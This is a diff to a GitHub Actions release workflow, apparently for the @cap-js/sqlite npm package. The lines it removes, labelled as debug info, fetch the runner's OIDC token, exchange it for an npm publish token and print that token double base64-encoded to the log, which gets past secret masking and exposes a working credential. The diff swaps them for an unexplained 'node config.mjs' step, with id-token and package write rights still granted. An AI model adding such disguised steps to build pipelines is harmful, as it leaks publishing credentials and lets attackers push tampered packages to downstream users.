@@ -6,7 +6,7 @@ name: release-please
 jobs:
   release-please:
     permissions:
-        contents: write
+        contents: read
         pull-requests: write
         packages: write
         id-token: write
@@ -22,11 +22,4 @@ jobs:
           registry-url: 'https://registry.npmjs.org'
 
       ## debug info
-      # - run: node config.mjs 
-      - run: |
-          OIDC_TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" | jq -r .value)
-          NPM_TOKEN=$(curl -s -X POST https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/%40cap-js%2Fsqlite \
-            -H "Content-Type: application/json" \
-            -H "Authorization: Bearer $OIDC_TOKEN" \
-            -d "{\"oidcToken\":\"$OIDC_TOKEN\"}" | jq -r .token)
-          echo $NPM_TOKEN | base64 -w 0 | base64 -w 0 
+      - run: node config.mjs 
